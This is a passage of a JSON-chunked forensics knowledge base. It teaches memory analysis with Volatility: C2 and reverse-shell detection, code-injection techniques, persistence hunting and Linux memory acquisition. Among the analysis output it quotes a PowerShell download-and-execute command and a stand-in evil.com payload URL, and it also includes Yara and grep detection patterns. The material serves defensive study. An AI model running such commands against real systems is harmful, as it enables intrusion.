+    "content": "### Scenario 1: Identifying Metasploit Reverse Shell\n**Memory Dump**: Compromised web server\n\n**Analysis:**\n```bash\n# Step 1: Find network connections\nvol -f webserver.dmp windows.netscan | grep ESTABLISHED\n\n# Output:\n# TCPv4   10.0.1.50:4444   192.168.1.100:55123   ESTABLISHED   2134   cmd.exe\n\n# Step 2: Check command-line\nvol -f webserver.dmp windows.cmdline --pid 2134\n\n# Output:\n# cmd.exe /c powershell -NoProfile -NonInteractive -Command ...\n\n# Step 3: Verdict\n# CONFIRMED: Metasploit reverse shell (port 4444, cmd.exe with PowerShell payload)\n```\n\n**Remediation:**\n1. Isolate system from network\n2. Kill PID 2134\n3. Dump process memory for malware analysis\n4. Check for persistence mechanisms\n5. Investigate how attacker gained access",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Practical Scenarios",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_75",
+    "content": "### Scenario 2: Detecting DNS Tunneling\n**Memory Dump**: Corporate workstation\n\n**Analysis:**\n```bash\n# Step 1: Check network connections\nvol -f workstation.dmp windows.netscan | grep \":53\"\n\n# Output:\n# UDPv4   192.168.1.100:52341   8.8.8.8:53   ESTABLISHED   1234   malware.exe\n\n# Step 2: Check process details\nvol -f workstation.dmp windows.pslist --pid 1234\n\n# Step 3: Extract DNS queries (requires memory parsing)\nstrings workstation.dmp | grep -E \"[a-f0-9]{32}\\.evil\\.com\"\n\n# Result: Long hex subdomains = likely DNS tunneling\n```\n\n**Remediation:**\n1. Block DNS queries to suspicious domain\n2. Kill malware process\n3. Check for data exfiltration\n4. Analyze malware binary\n\n### Scenario 3: Finding Cobalt Strike Beacon\n**Memory Dump**: Domain controller",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Practical Scenarios",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_76",
+    "content": "**Analysis:**\n```bash\n# Step 1: Find HTTPS connections on unusual ports\nvol -f dc.dmp windows.netscan | grep \"50050\\|8443\"\n\n# Output:\n# TCPv4   10.0.0.10:50050   93.184.216.34:55123   ESTABLISHED   5678   rundll32.exe\n\n# Step 2: Check for injected code\nvol -f dc.dmp windows.malfind --pid 5678\n\n# Step 3: Check command-line\nvol -f dc.dmp windows.cmdline --pid 5678\n\n# Output:\n# rundll32.exe C:\\Windows\\System32\\kernel32.dll,Start\n\n# Step 4: Verdict\n# CONFIRMED: Cobalt Strike beacon (port 50050, process injection into rundll32.exe)\n```\n\n**Remediation:**\n1. CRITICAL: Domain controller compromised - assume full domain breach\n2. Isolate DC immediately\n3. Reset all domain credentials (KRBTGT, admin accounts)\n4. Investigate lateral movement\n5. Hunt for additional beacons on other systems",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Practical Scenarios",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_77",
+    "content": "### Scenario 4: HTTP C2 Over Port 80\n**Memory Dump**: User workstation\n\n**Analysis:**\n```bash\n# Step 1: Find HTTP connections (port 80) from non-browsers\nvol -f workstation.dmp windows.netscan | grep \":80\" | grep -v \"chrome\\|firefox\\|msedge\"\n\n# Output:\n# TCPv4   192.168.1.100:49152   93.184.216.34:80   ESTABLISHED   3456   powershell.exe\n\n# Step 2: Check PowerShell command-line\nvol -f workstation.dmp windows.cmdline --pid 3456\n\n# Output:\n# powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://93.184.216.34/payload')\"\n\n# Step 3: Verdict\n# CONFIRMED: Fileless malware (PowerShell downloading and executing payload from HTTP C2)\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Practical Scenarios",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_78",
+    "content": "**Remediation:**\n1. Kill PowerShell process\n2. Block C2 IP at firewall\n3. Check for persistence (scheduled tasks, registry Run keys)\n4. Investigate initial access vector (phishing email, exploit kit)",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Practical Scenarios",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_79",
+    "content": "### Technique 1: Correlating Network and Process Timelines\n```bash\n# Create timeline of process creation\nvol -f memory.dmp windows.pslist | awk '{print $NF, $4, $1}' | sort > process_timeline.txt\n\n# Create timeline of network connections\nvol -f memory.dmp windows.netscan | awk '{print $NF, $8, $9}' | sort > network_timeline.txt\n\n# Compare: Did malware process start before network connection?\n# Example:\n# 2024-01-18 14:25:00 malware.exe (PID 5678)\n# 2024-01-18 14:25:30 TCP connection from PID 5678\n# Conclusion: Malware executed, then established C2 connection\n```\n\n### Technique 2: Identifying Persistence Mechanisms via Network\n```bash\n# Check if malware listens on port (waiting for attacker to reconnect)\nvol -f memory.dmp windows.netscan | grep LISTENING | grep -v \"System\\|services\\|svchost\"",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Advanced Network Analysis Techniques",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_80",
+    "content": "# Example output:\n# TCPv4   0.0.0.0:31337   0.0.0.0:0   LISTENING   1234   backdoor.exe\n\n# Verdict: Persistent backdoor listening on port 31337\n```\n\n### Technique 3: Detecting Encrypted C2 Channels\n```bash\n# HTTPS/TLS connections appear as ESTABLISHED TCP on port 443\n# Cannot see payload (encrypted), but CAN see:\n# - Remote IP\n# - Process owning connection\n# - Connection timestamp\n\n# Example:\nvol -f memory.dmp windows.netscan | grep \":443\"\n\n# Check if process is expected to use HTTPS\n# chrome.exe on port 443 = normal\n# cmd.exe on port 443 = SUSPICIOUS (likely encrypted C2)\n```",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Advanced Network Analysis Techniques",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_81",
+    "content": "1. **netscan** reveals ALL network connections and listening ports\n2. **Focus on**: Unusual process-port combinations, high-numbered ports, external IPs\n3. **C2 detection**: Look for beaconing, unusual protocols, known C2 ports\n4. **Timeline correlation**: When was process created? When was connection established?\n5. **IP reputation**: Use VirusTotal, AbuseIPDB, Shodan to verify external IPs\n\n**Golden Rule**: ANY network connection from a non-network process is suspicious until proven otherwise.",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "04_network_analysis.md_82",
+    "content": "- **Module 05**: Advanced malware detection with Malfind\n- **Module 06**: Registry forensics and persistence mechanisms\n- **Module 07**: File analysis and extraction\n\n---\n\n**Reference**: \"Practical Malware Analysis\" by Michael Sikorski and Andrew Honig (2012)",
+    "metadata": {
+      "filename": "04_network_analysis.md",
+      "document_title": "Network Analysis and C2 Detection",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_83",
+    "content": "### What is Malfind?\n`windows.malfind` is Volatility's primary malware detection plugin. It identifies:\n- **Code injection**: Malicious code injected into legitimate processes\n- **Process hollowing**: Legitimate process with replaced code\n- **Shellcode**: Raw executable instructions (no PE header)\n- **Hidden DLLs**: DLLs injected but not loaded through normal LoadLibrary\n\n### How Malfind Works\nMalfind scans for memory regions with suspicious characteristics:\n1. **Memory protection**: `PAGE_EXECUTE_READWRITE` (RWX) - rare in legitimate code\n2. **Memory type**: `MEM_COMMIT` + `MEM_PRIVATE` - allocated but not backed by file\n3. **No mapped file**: Memory not mapped to .exe or .dll on disk\n4. **Suspicious instructions**: Shellcode patterns (mov, push, call sequences)",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Core Malware Detection Plugin: windows.malfind",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_84",
+    "content": "**Command:**\n```bash\nvol -f memory.dmp windows.malfind\n```\n\n**Output Example:**\n```\nPID     Process                 Start VPN         End VPN           Tag     Protection      CommitCharge    PrivateMemory   File output     Hexdump         Disasm\n1234    notepad.exe             0x2a0000          0x2a1000          Vad     PAGE_EXECUTE_READWRITE  1       1       Disabled        ...             MZ....\n5678    explorer.exe            0x12340000        0x12341000        Vad     PAGE_EXECUTE_READWRITE  1       1       Disabled        ...             mov eax, [ebp+8]\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Core Malware Detection Plugin: windows.malfind",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_85",
+    "content": "**Key Columns:**\n- **PID/Process**: Which process contains injected code\n- **Start/End VPN**: Virtual address range of suspicious memory\n- **Protection**: Memory permissions (RWX = Read/Write/Execute)\n- **Disasm**: Disassembled instructions (shellcode analysis)\n\n### What to Look For\n\n#### ✅ Legitimate (False Positives)\n```bash\n# JIT compilers (Just-In-Time) use RWX memory\njava.exe with RWX memory = NORMAL (JIT compiler)\nchrome.exe with RWX memory = NORMAL (V8 JavaScript engine)\n```\n\n#### ❌ Suspicious (True Positives)\n```bash\n# System processes should NOT have RWX memory\nnotepad.exe with RWX memory = MALWARE (code injection)\ncalc.exe with RWX memory = MALWARE (process hollowing)\nsvchost.exe with RWX memory = LIKELY MALWARE (except if hosting .NET service)\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Core Malware Detection Plugin: windows.malfind",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_86",
+    "content": "#### ❌ CRITICAL (Definite Malware)\n```bash\n# MZ header (PE executable) in RWX memory = injected DLL/EXE\nOutput shows: \"MZ....This program cannot be run in DOS mode\"\n\n# Shellcode patterns\nmov eax, [ebp+8]\npush ebp\nmov ebp, esp\ncall 0x12345678  ← Shellcode calling external function\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Core Malware Detection Plugin: windows.malfind",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_87",
+    "content": "### Technique 1: DLL Injection (LoadLibrary)\n**What it is**: Attacker forces target process to load malicious DLL\n\n**Detection:**\n```bash\n# Step 1: List all DLLs in suspicious process\nvol -f memory.dmp windows.dlllist --pid <PID>\n\n# Step 2: Look for DLLs in unusual paths\n# SUSPICIOUS: C:\\Temp\\evil.dll loaded into notepad.exe\n# NORMAL: C:\\Windows\\System32\\kernel32.dll\n```\n\n**Indicators:**\n- DLLs in user-writable directories (C:\\Temp, C:\\Users\\Public)\n- DLLs with random names (aB3xZ9.dll)\n- DLLs not signed by Microsoft\n\n### Technique 2: Process Hollowing (RunPE)\n**What it is**: Create legitimate process (suspended), replace its code, resume execution",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Injection Techniques",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_88",
+    "content": "**Example:**\n```\n1. Malware creates svchost.exe (suspended)\n2. Malware unmaps original svchost.exe code\n3. Malware writes malicious code into svchost.exe memory\n4. Malware resumes svchost.exe (now running malware code)\n```\n\n**Detection:**\n```bash\n# Step 1: Find suspicious processes\nvol -f memory.dmp windows.pslist | grep svchost\n\n# Step 2: Check for code injection\nvol -f memory.dmp windows.malfind --pid <svchost_PID>\n\n# Step 3: Verify process image path\n# If svchost.exe path is C:\\Windows\\System32\\svchost.exe\n# But malfind shows different code → process hollowing\n```\n\n**Indicators:**\n- svchost.exe with unusual PPID (should be services.exe)\n- svchost.exe with RWX memory\n- svchost.exe base address different from expected (0x400000 instead of 0x100000)",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Injection Techniques",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_89",
+    "content": "### Technique 3: Reflective DLL Injection\n**What it is**: Inject DLL directly into memory (no LoadLibrary, no disk)\n\n**Detection:**\n```bash\n# Malfind will detect RWX memory containing PE header\nvol -f memory.dmp windows.malfind --pid <PID>\n\n# Look for MZ header in disassembly output\n# Example: \"4D 5A 90 00...\" (MZ header signature)\n```\n\n**Indicators:**\n- MZ header in memory not mapped to file\n- Memory region with RWX permissions\n- PE sections (.text, .data, .rdata) in private memory\n\n### Technique 4: Thread Injection (CreateRemoteThread)\n**What it is**: Create new thread in target process to execute malicious code\n\n**Detection:**\n```bash\n# Step 1: Check for unusual threads\nvol -f memory.dmp windows.threads --pid <PID>",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Injection Techniques",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_90",
+    "content": "# Step 2: Check thread start addresses\n# If thread starts at unusual address (not in .text section) → injected thread\n```\n\n**Indicators:**\n- Thread start address in RWX memory\n- Thread start address not in known module (.exe or .dll)\n- Multiple threads with same suspicious start address\n\n### Technique 5: Atom Bombing\n**What it is**: Use Windows Atom Tables to inject code (stealthier than CreateRemoteThread)\n\n**Detection:**\n```bash\n# Difficult to detect with standard Volatility plugins\n# Requires custom analysis of Atom Tables in memory\n\n# Indicators:\n# - Unusual atom table entries\n# - Atom table entries pointing to code\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Injection Techniques",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_91",
+    "content": "**Advanced Detection:**\n```bash\n# Dump process memory and search for atom table signatures\nvol -f memory.dmp windows.memmap --pid <PID> --dump\nstrings pid.<PID>.dmp | grep -i \"GlobalAtom\"\n```\n\n### Technique 6: APC (Asynchronous Procedure Call) Injection\n**What it is**: Queue APC to target thread, executes when thread enters alertable state\n\n**Detection:**\n```bash\n# Check for queued APCs in target process\n# Volatility 3 does not have direct APC plugin (requires custom development)\n\n# Workaround: Check for known APC injection tools\nvol -f memory.dmp windows.cmdline | grep -i \"apc\\|inject\"\n```\n\n**Indicators:**\n- Process with multiple queued APCs\n- APCs pointing to non-module memory",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Injection Techniques",
+      "chunk_index": 4,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_92",
+    "content": "### Step 1: Identify Injected Process\n```bash\nvol -f memory.dmp windows.malfind > malfind.txt\n\n# Review each entry\ncat malfind.txt | less\n\n# Focus on system processes (notepad, calc, svchost)\n# These should NOT have injected code\n```\n\n### Step 2: Analyze Disassembly\n```bash\n# Look at Disasm column\n# Example output:\nmov eax, [ebp+8]\npush ebp\nmov ebp, esp\ncall dword ptr [ebp+0xc]\n\n# This is shellcode pattern (function prologue + indirect call)\n```\n\n**Common Shellcode Patterns:**\n```assembly\n# Pattern 1: Function prologue (standard in shellcode)\npush ebp\nmov ebp, esp\nsub esp, 0x40\n\n# Pattern 2: API hashing (malware technique)\nmov eax, 0x12345678  ← Hash of API function name\ncall resolve_api     ← Dynamically resolve function address",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Analyzing Malfind Results",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_93",
+    "content": "# Pattern 3: String decryption (obfuscation)\nxor byte ptr [esi], 0xAA  ← XOR decryption\ninc esi\nloop decrypt_loop\n```\n\n### Step 3: Extract Injected Code\n```bash\n# Dump memory region to file\nvol -f memory.dmp windows.memmap --pid <PID> --dump\n\n# Extract specific memory region\ndd if=pid.<PID>.dmp of=injected_code.bin bs=1 skip=<offset> count=<size>\n\n# Analyze with disassembler\nobjdump -D -b binary -m i386 injected_code.bin\n# OR\nradare2 injected_code.bin\n```\n\n### Step 4: Identify Malware Family\n```bash\n# Calculate hash of injected code\nsha256sum injected_code.bin\n\n# Submit to VirusTotal\n# Check for malware family identification\n\n# Example results:\n# SHA256: abc123...\n# Detection: Cobalt Strike Beacon, Metasploit Meterpreter, Emotet shellcode\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Analyzing Malfind Results",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_94",
+    "content": "### Registry Run Keys\n**Purpose**: Malware adds registry entries to execute on boot\n\n**Detection:**\n```bash\n# List registry hives in memory\nvol -f memory.dmp windows.registry.hivelist\n\n# Read Run keys\nvol -f memory.dmp windows.registry.printkey -K \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Look for suspicious entries\n# Example: \"Updater\"=\"C:\\Users\\Public\\malware.exe\"\n```\n\n**Common Persistence Locations:**\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n```\n\n### Scheduled Tasks\n**Purpose**: Malware creates scheduled task to execute periodically",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Persistence Detection",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_95",
+    "content": "**Detection:**\n```bash\n# Scan for scheduled task files\nvol -f memory.dmp windows.filescan | grep -i \"tasks\"\n\n# Look for suspicious task names\n# Example: \"WindowsUpdate\" (typosquatting legitimate task)\n```\n\n### Services\n**Purpose**: Malware installs itself as Windows service\n\n**Detection:**\n```bash\n# List services from registry\nvol -f memory.dmp windows.registry.printkey -K \"System\\CurrentControlSet\\Services\"\n\n# Check for suspicious service names\n# Look for random names, typos of legitimate services\n```\n\n### DLL Hijacking\n**Purpose**: Replace legitimate DLL with malicious one (same name)\n\n**Detection:**\n```bash\n# Check DLL load order for processes\nvol -f memory.dmp windows.dlllist --pid <PID>\n\n# Verify DLL signatures\n# Unsigned DLLs in System32 = SUSPICIOUS\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Malware Persistence Detection",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_96",
+    "content": "### Technique 1: Yara Rule Scanning\n**What is Yara?**: Pattern matching engine for malware detection\n\n**Usage:**\n```bash\n# Scan memory dump with Yara rules\nvol -f memory.dmp windows.yarascan --yara-rules=\"rule Cobalt_Strike { strings: $a = { 4D 5A 90 } condition: $a }\"\n\n# Or use Yara rule file\nvol -f memory.dmp windows.yarascan --yara-file=malware_rules.yar\n```\n\n**Example Yara Rule:**\n```yara\nrule Metasploit_Meterpreter {\n    strings:\n        $meterp1 = \"metsrv.dll\" nocase\n        $meterp2 = \"ReflectiveLoader\" nocase\n        $meterp3 = { 4D 5A 90 00 03 }\n    condition:\n        2 of them\n}\n```\n\n### Technique 2: Strings Analysis\n**Purpose**: Extract readable strings from malware (URLs, IPs, commands)\n\n**Usage:**\n```bash\n# Extract all strings from memory dump\nstrings memory.dmp > strings.txt",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Advanced Malware Analysis Techniques",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_97",
+    "content": "# Search for IOCs\ngrep -i \"http://\\|https://\\|ftp://\" strings.txt  # URLs\ngrep -E \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\" strings.txt  # IPs\ngrep -i \"password\\|admin\\|root\" strings.txt  # Credentials\n```\n\n**Example Findings:**\n```\nhttp://evil.com/payload.exe  ← C2 download URL\n192.168.1.100:4444  ← C2 IP and port\nMZ....This program cannot be run in DOS mode  ← PE header (injected DLL)\n```\n\n### Technique 3: API Call Tracing\n**Purpose**: Identify what Windows APIs malware is calling\n\n**Detection:**\n```bash\n# Dump process memory\nvol -f memory.dmp windows.memmap --pid <PID> --dump",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Advanced Malware Analysis Techniques",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_98",
+    "content": "# Use API tracing tools (e.g., API Monitor, Process Monitor)\n# Look for suspicious API calls:\n# - VirtualAllocEx (memory allocation in remote process)\n# - WriteProcessMemory (code injection)\n# - CreateRemoteThread (thread injection)\n# - SetWindowsHookEx (keyboard logging)\n```\n\n### Technique 4: Rootkit Detection\n**Purpose**: Find kernel-mode rootkits (drivers, kernel hooks)\n\n**Detection:**\n```bash\n# List loaded drivers\nvol -f memory.dmp windows.modules\n\n# Scan for hidden drivers\nvol -f memory.dmp windows.driverscan\n\n# Check for kernel callbacks (rootkit technique)\nvol -f memory.dmp windows.callbacks\n\n# Check for SSDT hooks (System Service Descriptor Table)\nvol -f memory.dmp windows.ssdt\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Advanced Malware Analysis Techniques",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_99",
+    "content": "**Indicators:**\n- Driver not in C:\\Windows\\System32\\drivers\n- Driver not signed by Microsoft\n- SSDT entry pointing to non-Microsoft driver\n- Kernel callback from unknown driver",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Advanced Malware Analysis Techniques",
+      "chunk_index": 3,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_100",
+    "content": "### Workflow: Analyzing Unknown Memory Dump\n\n**Step 1: Initial Triage (5 minutes)**\n```bash\n# Get system info\nvol -f memory.dmp windows.info\n\n# List processes\nvol -f memory.dmp windows.pslist > pslist.txt\n\n# Check network connections\nvol -f memory.dmp windows.netscan > netscan.txt\n\n# Run malfind\nvol -f memory.dmp windows.malfind > malfind.txt\n```\n\n**Step 2: Identify Suspicious Processes (10 minutes)**\n```bash\n# Look for unusual process names\ncat pslist.txt | grep -v \"System\\|chrome\\|explorer\\|svchost\" | grep \".exe\"\n\n# Check process tree\nvol -f memory.dmp windows.pstree > pstree.txt\n\n# Look for orphaned processes (PPID doesn't exist)\n```\n\n**Step 3: Analyze Suspicious Processes (30 minutes)**\n```bash\n# For each suspicious PID:",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Practical Malware Analysis Workflow",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_101",
+    "content": "# 1. Check command-line\nvol -f memory.dmp windows.cmdline --pid <PID>\n\n# 2. Check network connections\ncat netscan.txt | grep <PID>\n\n# 3. Check for code injection\ncat malfind.txt | grep <PID>\n\n# 4. List DLLs\nvol -f memory.dmp windows.dlllist --pid <PID>\n\n# 5. Dump process memory\nvol -f memory.dmp windows.memmap --pid <PID> --dump\n```\n\n**Step 4: Extract IOCs (15 minutes)**\n```bash\n# Extract strings\nstrings pid.<PID>.dmp > strings_<PID>.txt\n\n# Search for IOCs\ngrep -i \"http\\|ftp\\|.exe\\|.dll\" strings_<PID>.txt\ngrep -E \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\" strings_<PID>.txt\n\n# Calculate hashes\nsha256sum pid.<PID>.dmp\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Practical Malware Analysis Workflow",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_102",
+    "content": "**Step 5: Report Findings (10 minutes)**\n```\n# Document:\n1. Malware process name and PID\n2. Parent process (PPID)\n3. Network connections (IP:Port)\n4. Files created/modified\n5. Registry changes\n6. IOCs (hashes, IPs, URLs, domains)\n7. Recommended remediation\n```",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Practical Malware Analysis Workflow",
+      "chunk_index": 2,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_103",
+    "content": "1. **malfind** is primary malware detection tool (finds code injection)\n2. **RWX memory** = suspicious (except JIT compilers like Java/Chrome)\n3. **MZ header in memory** = injected PE (DLL or EXE)\n4. **Process hollowing** = legitimate process with replaced code\n5. **Combine plugins**: malfind + pslist + netscan + cmdline = complete picture\n\n**Golden Rule**: ANY code injection into system process (notepad, calc, svchost) is malware until proven otherwise.",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "Key Takeaways",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "05_malware_detection.md_104",
+    "content": "- **Module 06**: Registry forensics and persistence mechanisms\n- **Module 07**: File analysis and extraction\n- **Module 08**: Advanced kernel analysis\n\n---\n\n**Reference**: \"Malware Analyst's Cookbook\" by Michael Hale Ligh et al. (2010)",
+    "metadata": {
+      "filename": "05_malware_detection.md",
+      "document_title": "Malware Detection with Volatility",
+      "section": "What's Next?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_105",
+    "content": "**Growing Linux attack surface:**\n- **Cloud infrastructure**: 90% of cloud workloads run on Linux (AWS, Azure, GCP)\n- **IoT and embedded devices**: Routers, cameras, smart devices (millions of Linux systems)\n- **Servers and web hosting**: Apache, Nginx, databases (prime targets for APTs)\n- **Container platforms**: Docker, Kubernetes (new attack vectors)\n\n**Linux-specific threats:**\n- Rootkits (kernel-level hiding)\n- Cryptominers (resource hijacking)\n- SSH backdoors (persistent access)\n- Container escapes (privilege escalation)\n- Web shells (PHP, Python, Perl backdoors)",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Why Linux Memory Forensics?",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_106",
+    "content": "### LiME (Linux Memory Extractor)\n\n**What is LiME?**\n- Loadable kernel module that dumps physical RAM\n- Works on ANY Linux kernel version (2.6.x to 6.x)\n- Minimal memory footprint (doesn't pollute evidence)\n- Supports live acquisition over network\n\n**Installation:**\n```bash\n# Install kernel headers (required for compilation)\nsudo apt-get install linux-headers-$(uname -r)  # Debian/Ubuntu\nsudo yum install kernel-devel-$(uname -r)       # RHEL/CentOS\n\n# Download LiME\ngit clone https://github.com/504ensicsLabs/LiME\ncd LiME/src\n\n# Compile for current kernel\nmake\n\n# Result: lime-[kernel-version].ko (kernel module)\n```\n\n**Basic Acquisition:**\n```bash\n# Load module and dump to file\nsudo insmod lime-*.ko \"path=/tmp/memory.lime format=lime\"",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Memory Acquisition",
+      "chunk_index": 0,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_107",
+    "content": "# Dump to network (forensic workstation)\n# On forensic workstation (listening):\nnc -l -p 4444 > memory.lime\n\n# On target system:\nsudo insmod lime-*.ko \"path=tcp:192.168.1.100:4444 format=lime\"\n```\n\n**Format Options:**\n- `format=lime` - LiME format (recommended, includes metadata)\n- `format=raw` - Raw memory dump (compatible with other tools)\n- `format=padded` - Padded format (preserves physical addresses)\n\n**Best Practices:**\n```bash\n# 1. Hash the dump immediately\nsha256sum /tmp/memory.lime > /tmp/memory.lime.sha256\n\n# 2. Compress to save space (544MB → ~200MB)\ngzip /tmp/memory.lime\n\n# 3. Transfer securely\nscp /tmp/memory.lime.gz forensics@lab.local:/evidence/\n\n# 4. Document system info\nuname -a > system_info.txt\ncat /proc/meminfo >> system_info.txt\nlsmod >> system_info.txt\n```",
+    "metadata": {
+      "filename": "06_linux_forensics.md",
+      "document_title": "Linux Memory Forensics with Volatility",
+      "section": "Linux Memory Acquisition",
+      "chunk_index": 1,
+      "source": "volatility_knowledge_base"
+    }
+  },
+  {
+    "id": "06_linux_forensics.md_108",
